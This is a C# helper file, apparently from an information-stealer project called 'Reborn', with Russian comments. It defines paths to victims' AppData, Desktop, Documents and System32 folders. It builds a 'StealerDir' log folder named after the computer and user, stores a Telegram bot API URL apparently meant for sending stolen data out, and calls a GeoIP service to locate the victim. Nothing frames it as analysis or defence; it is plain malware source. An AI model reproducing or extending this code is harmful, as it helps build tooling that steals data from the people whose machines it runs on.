using System;
using System.IO;
using System.Net;
using System.Reflection;
using System.Xml;

namespace Reborn
{
    class Help
    {
        // Директории
        public static readonly string DesktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop); // Рабочий стол
        public static readonly string LocalData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData); // AppData\Local
        public static readonly string System = Environment.GetFolderPath(Environment.SpecialFolder.System); // System32
        public static readonly string AppDate = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData); // %appdata%
        public static readonly string CommonData = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData); // C:\ProgramData
        public static readonly string MyDocuments = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments); // Документы
        public static readonly string UserProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile); // C:\Users\admin
        public static readonly string DirectoryBuild = AppDate + "\\Plombir\\";
        public static readonly string PatchBuildName = Assembly.GetExecutingAssembly().Location;
        public static readonly string PatchBuild = Path.GetDirectoryName(PatchBuildName);


        // Выбираем рандомную системную папку
        //public static string[] SysPatch = new string[]
        //{
        //        LocalData, AppDate, Path.GetTempPath()
        //};
        public static string[] SysPatch = new string[]
        {
                AppDate
        };


        // генерируем директорию для лога
        public static string StealDir = SysPatch[new Random().Next(0, SysPatch.Length)];

        //сохраняем эту директорию
        public static string StealerDir = StealDir + "\\" + GenString.Generate() + SystemInfo.compname + "." + SystemInfo.username;

        // Получение даты лога
        public static string date = DateTime.Now.ToString("MM/dd/yyyy h:mm");
        public static string dateLog = DateTime.Now.ToString("MM/dd/yyyy"); 

        // Ссылки
        public static string GeoIP = "https://freegeoip.app/xml/";  
        public static string ApiUrl = "https://api.telegram.org/bot"; 
        public static string VimeAPI = "https://api.vimeworld.ru/user/name/";

        // Получение информации о айпи
        public static XmlDocument xml = new XmlDocument();
        public static bool check = true;
        public static void Ethernet()
        {
            try
            {
                xml.LoadXml(new WebClient().DownloadString(GeoIP));
            }
            catch(Exception e)
            {
                Console.WriteLine(e + "Ethernet()");
                check = false;
            }
        }
    }
}
